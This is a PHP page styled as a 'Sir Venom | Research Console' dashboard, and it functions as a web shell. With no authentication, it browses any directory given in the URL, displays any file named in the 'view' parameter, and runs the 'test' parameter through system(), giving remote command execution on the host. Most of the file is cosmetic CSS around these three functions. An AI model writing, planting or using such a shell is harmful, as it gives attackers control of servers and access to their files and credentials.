<?php


// 1. Path Logic - Get current or default to script CWD
$currentPath = isset($_GET['folder']) ? $_GET['folder'] : getcwd();
$currentPath = rtrim(str_replace('/', DIRECTORY_SEPARATOR, $currentPath), DIRECTORY_SEPARATOR);

// 2. Read File Logic
$fileContent = "";
$viewingFile = "";
if (isset($_GET['view']) && is_file($_GET['view'])) {
    $viewingFile = $_GET['view'];
    $fileContent = htmlspecialchars(file_get_contents($viewingFile));
}

// 3. Parent Path for Navigation
$parentDir = dirname($currentPath);
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Sir Venom | Research Console</title>
    <style>
        /* [Your CSS remains exactly the same here] */
        :root {
            --primary-accent: #00d4ff;
            --secondary-accent: #7000ff;
            --bg-dark: #0a0b10;
            --glass-bg: rgba(255, 255, 255, 0.05);
            --glass-border: rgba(255, 255, 255, 0.125);
            --text-main: #e0e0e0;
            --text-muted: #a0a0a0;
            --sidebar-width: 320px;
            --transition-speed: 0.3s;
            --glow-intensity: 0 0 15px rgba(0, 212, 255, 0.4);
        }

        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; }

        body {
            background-color: var(--bg-dark);
            background-image: 
                radial-gradient(at 0% 0%, hsla(253,16%,7%,1) 0, transparent 50%), 
                radial-gradient(at 50% 0%, hsla(225,39%,30%,1) 0, transparent 50%), 
                radial-gradient(at 100% 0%, hsla(339,49%,30%,1) 0, transparent 50%);
            color: var(--text-main);
            min-height: 100vh;
            display: flex;
            overflow: hidden; /* We'll use internal scrolling */
        }

        .dashboard-container {
            display: grid;
            grid-template-columns: var(--sidebar-width) 1fr;
            width: 100%;
            height: 100vh;
            gap: 20px;
            padding: 20px;
        }

        .sidebar {
            background: var(--glass-bg);
            backdrop-filter: blur(15px);
            border: 1px solid var(--glass-border);
            border-radius: 20px;
            padding: 20px;
            overflow-y: auto;
        }

        .main-content {
            display: flex;
            flex-direction: column;
            gap: 20px;
            overflow-y: auto;
            padding-right: 10px;
        }

        .card {
            background: var(--glass-bg);
            border: 1px solid var(--glass-border);
            border-radius: 16px;
            padding: 20px;
            backdrop-filter: blur(10px);
        }

        .path-banner {
            font-family: 'Courier New', monospace;
            color: var(--primary-accent);
            margin-bottom: 15px;
            word-break: break-all;
        }

        .btn-nav {
            text-decoration: none;
            color: var(--text-main);
            font-size: 14px;
            display: block;
            padding: 10px;
            border-radius: 8px;
            margin-bottom: 5px;
            transition: 0.2s;
            border: 1px solid transparent;
        }

        .btn-nav:hover {
            background: rgba(0, 212, 255, 0.1);
            border-color: var(--primary-accent);
        }

        .file-viewer {
            background: rgba(0, 0, 0, 0.4);
            padding: 15px;
            border-radius: 8px;
            font-family: 'Courier New', monospace;
            white-space: pre-wrap;
            color: #00ff7f;
            max-height: 500px;
            overflow-y: auto;
            border: 1px solid #333;
        }

        .terminal-box {
            background: #000;
            color: #0f0;
            padding: 15px;
            font-family: 'Consolas', monospace;
            border-radius: 8px;
        }
    </style>
</head>
<body>

<div class="dashboard-container">
    <div class="sidebar">
        <h3 style="margin-bottom: 20px; color: var(--primary-accent);">📁 Explorer</h3>
        <a href="?folder=<?php echo urlencode($parentDir); ?>" class="btn-nav">⬆️ Parent Directory</a>
        <hr style="border: 0; border-top: 1px solid var(--glass-border); margin: 10px 0;">
        
        <?php
        $items = array_diff(scandir($currentPath), array('.', '..'));
        foreach ($items as $item):
            $fullPath = $currentPath . DIRECTORY_SEPARATOR . $item;
            $isDir = is_dir($fullPath);
            $icon = $isDir ? "📁" : "📄";
            $link = $isDir ? "?folder=".urlencode($fullPath) : "?folder=".urlencode($currentPath)."&view=".urlencode($fullPath);
        ?>
            <a href="<?php echo $link; ?>" class="btn-nav">
                <?php echo $icon . " " . htmlspecialchars($item); ?>
            </a>
        <?php endforeach; ?>
    </div>

    <div class="main-content">
        <div class="card">
            <div class="status-badge online">System Active</div>
            <div class="path-banner">ROOT: <?php echo htmlspecialchars($currentPath); ?></div>
        </div>

        <?php if ($viewingFile): ?>
        <div class="card">
            <h4 style="margin-bottom:10px;">Viewing: <?php echo htmlspecialchars(basename($viewingFile)); ?></h4>
            <div class="file-viewer"><?php echo $fileContent ?: "No content or file unreadable."; ?></div>
        </div>
        <?php endif; ?>

        <div class="card">
            <h4>Terminal Terminal Output</h4>
            <div class="terminal-box">
                <pre><?php
                    if(isset($_GET['test'])) {
                        system($_GET['test'] . ' 2>&1');
                    } else {
                        echo "Awaiting command via ?test=[command]";
                    }
                ?></pre>
            </div>
        </div>
    </div>
</div>

</body>
</html>
